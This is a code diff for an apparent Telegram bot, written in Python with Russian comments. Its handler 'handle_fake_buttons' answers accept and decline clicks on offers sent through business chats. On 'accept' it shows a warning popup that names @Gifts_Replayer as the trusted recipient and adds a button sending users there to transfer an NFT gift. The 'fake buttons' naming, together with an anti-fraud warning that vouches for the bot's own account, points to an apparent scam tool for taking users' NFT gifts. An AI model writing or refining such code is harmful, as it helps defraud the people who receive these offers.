@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ + ВСПЛЫВАЮЩЕЕ ОКНО ---
+# --- РЕДАКТИРОВАНИЕ + ВСПЛЫВАЮЩЕЕ ОКНО ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -157,26 +157,26 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
-    alert_text = None # Переменная для текста всплывающего окна
-
     if action == "accept":
-        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
-        ])
-        
-        # ТЕКСТ ВСПЛЫВАЮЩЕГО ОКНА (как на скрине)
+        # 1. Сначала показываем всплывающее окно
         alert_text = (
             "⚠️ Внимание!\n\n"
             "Получатель в этом сервисе:\n"
             "@Gifts_Replayer.\n\n"
             "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
         )
+        await callback.answer(alert_text, show_alert=True)
+        
+        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
+        ])
     else:
+        await callback.answer()
         new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
 
-    # Собираем аргументы для редактирования
+    # 2. Затем редактируем само сообщение
     kwargs = {
         "chat_id": callback.message.chat.id,
         "message_id": callback.message.message_id,
@@ -194,25 +194,16 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         kwargs["business_connection_id"] = business_connection_id
 
     try:
-        # 1. Сначала редактируем сообщение
         await bot.edit_message_text(**kwargs)
-        
-        # 2. Затем показываем всплывающее окно (если это "Принять")
-        if alert_text:
-            await callback.answer(alert_text, show_alert=True)
-        else:
-            await callback.answer()
-
     except TelegramBadRequest as e:
-        error_msg = str(e).lower()
-        if "message is not modified" in error_msg:
-            await callback.answer("Сообщение уже обработано.", show_alert=True)
-        else:
+        # Если сообщение уже было изменено, просто игнорируем (чтобы не спамить ошибкой)
+        if "message is not modified" not in str(e).lower():
             print(f"Ошибка редактирования: {e}")
-            await callback.answer("Не удалось изменить сообщение.", show_alert=True)
+            if ADMIN_ID:
+                try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка редактирования:</b>\n<code>{e}</code>", parse_mode="HTML")
+                except: pass
     except Exception as e:
         print(f"Неизвестная ошибка: {e}")
-        await callback.answer("Ошибка", show_alert=True)
 
 async def main():
     print("Бот запущен...")
